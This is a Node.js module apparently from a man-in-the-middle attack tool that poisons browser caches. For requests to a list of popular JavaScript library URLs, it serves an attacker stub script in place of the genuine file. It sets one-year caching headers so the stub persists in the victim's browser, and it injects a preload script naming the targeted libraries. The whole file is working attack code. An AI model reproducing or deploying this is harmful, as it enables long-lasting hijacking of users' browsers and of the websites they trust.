'use strict';

var program = require('commander'),
	injector = require('./injector'),
	util = require('./util'),
	config = require('./config.json');


// 常用脚本库
var jslib_map = require('./asset/poisoning/list.json');

//
var stubCode;


function loadJs(file) {
	if (!program.debug) {
		file = file.replace('.js', '.min.js');
	}
	return util.readText('./asset/poisoning/' + file);
}


function loadStubCode() {
	// load stub code
	stubCode = loadJs('stub.js');

	if (!stubCode) {
		util.err('fail load stub.js');
		return;
	}
	return true;
}


function loadExternCode() {

	// load extern code
	var code = loadJs('preload.js');
	if (!code) {
		util.err('fail load preload.js');
		return;
	}

	// 填充常用脚本列表
	var list = Object.keys(jslib_map).join('|');
	injector.updateExternJs('PRELOAD', code.replace('$LIST', list));
	return true;
}


exports.request = function(req, res) {

	var url = req.headers['host'] + req.url;
	var js = jslib_map[url];
	if (!js) {
		return;
	}

	// ...
	var buf = js.data;
	if (!buf) {
		var stub = stubCode.replace(/\$URL_RAW/g, url);
		buf = js.data = new Buffer(stub);
	}

	// ...
	var etag = js.etag,
		sec = 365 * 24 * 3600,
		exp = new Date(Date.now() + sec).toGMTString(),
		now = new Date().toGMTString(),
		hdr = {
			'Content-Type'	: 'text/javascript',
			'Content-Length': buf.length,
			'Cache-Control'	: 'max-age=' + sec,
			'Expires'		: exp,
			'Date'			: now,
			'Last-Modified'	: now
		};

	if (etag) {
		hdr['ETag'] = etag;
	}

	return {
		status: 200,
		header: hdr,
		data: buf
	};
};


exports.init = function() {

	if (!loadStubCode()) {
		return;
	}
	if (!loadExternCode()) {
		return;
	}
	return true;
};